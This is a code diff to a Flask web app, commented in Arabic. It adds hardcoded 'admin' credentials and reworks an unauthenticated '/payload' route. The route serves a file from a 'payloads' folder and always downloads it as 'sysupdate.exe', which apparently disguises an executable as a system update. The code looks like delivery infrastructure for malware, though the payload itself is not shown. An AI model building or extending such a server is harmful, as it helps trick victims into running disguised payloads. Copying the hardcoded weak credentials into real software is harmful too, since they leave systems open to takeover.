@@ -9,8 +9,8 @@ app = Flask(__name__)
 app.secret_key = os.urandom(32)
 
 # ===== بيانات الدخول =====
-USERNAME = "Kernal_FFX0"
-PASSWORD_HASH = hashlib.sha256("Kernal_FFX0@SecurePass123".encode()).hexdigest()
+USERNAME = "admin"
+PASSWORD_HASH = hashlib.sha256("SecurePass123".encode()).hexdigest()
 
 # ===== نظام القفل المتقدم =====
 failed_attempts = {}
@@ -88,15 +88,26 @@ def logout():
     return redirect(url_for('login'))
 
 # ===== مسار التحميل العام (بدون حماية) =====
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+
 @app.route('/payload')
 def download_payload():
     try:
-        file_path = os.path.join(os.getcwd(), 'payloads', 'sysupdate.exe')
-        if not os.path.exists(file_path):
-            return "الملف غير موجود", 404
+        # نحاول نبحث عن الملف سواء كان sysupdate أو sysupdate.exe
+        possible_names = ['sysupdate.exe', 'sysupdate']
+        file_path = None
+        for name in possible_names:
+            test_path = os.path.join(BASE_DIR, 'payloads', name)
+            if os.path.exists(test_path):
+                file_path = test_path
+                break
+        
+        if not file_path:
+            return f"الملف غير موجود في مجلد payloads (ابحث عن sysupdate أو sysupdate.exe)", 404
+            
         return send_file(file_path, as_attachment=True, download_name='sysupdate.exe')
     except Exception as e:
-        return f"خطأ: {e}", 500
+        return f"خطأ داخلي: {str(e)}", 500
 
 @app.route('/download')
 def download_page():
